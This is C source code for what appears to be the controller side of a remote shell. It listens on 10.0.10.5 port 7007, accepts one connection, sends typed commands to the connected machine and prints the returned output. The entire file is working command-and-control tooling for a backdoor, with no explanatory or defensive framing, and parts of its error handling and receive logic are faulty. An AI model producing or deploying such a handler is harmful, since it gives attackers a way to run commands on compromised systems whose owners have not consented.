#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>



void Shell(int sock);


int main(){
    int sock;
    struct sockaddr_in ServerAdd, ClientAdd;
    int opt = 1;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    
    if (!sock){
        printf("SOCKET ERROR!");
        return 1;
    }

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0){
        printf("SETSOCKOPT ERROR!");
        return 1;
    }
    
    // Initiate Server Obj with its properties
    ServerAdd.sin_family = AF_INET;
    ServerAdd.sin_addr.s_addr = inet_addr("10.0.10.5");
    ServerAdd.sin_port = htons(7007);

    if(bind(sock, (struct sockaddr *) &ServerAdd, sizeof(ServerAdd)) < 0){
        printf("BIND ERROR!");
        return 1;
    }
    
    printf("[+] Listening for Incomming Connections...\n");

    if (listen(sock, 3) < 0){
        printf("LISTEN ERROR!");
        return 1;
    }

    int client_sock;
    int ServerAddLen = sizeof(ServerAdd);

    client_sock = accept(sock, (struct sockaddr *) &ServerAdd, (socklen_t *) &ServerAddLen);

    if (client_sock < 0){
        printf("ACCEPT ERROR!");
        return 1;
    }

    Shell(client_sock);

    return 0;
}



void Shell(int sock){
    char SendCMD[1024];
    char RecvCMD[1048576];

    while(1){
        bzero(&SendCMD, sizeof(SendCMD));
        bzero(&RecvCMD, sizeof(RecvCMD));
        
        printf("Enter Command > ");
        
        fgets(SendCMD, sizeof(SendCMD), stdin);
        strtok(SendCMD, "\n");

        send(sock, SendCMD, sizeof(SendCMD), 0);

        if (!strcmp(SendCMD, "quit")){
            break;
        }

        recv(sock, RecvCMD, sizeof(RecvCMD), MSG_WAITALL); //requests that the operation block until the full request is satisfied

        if (!strlen(RecvCMD)){
            printf("[!] This Command is not recognized.\n");
            continue;
        }

        printf("%s\n", RecvCMD);
    }
}
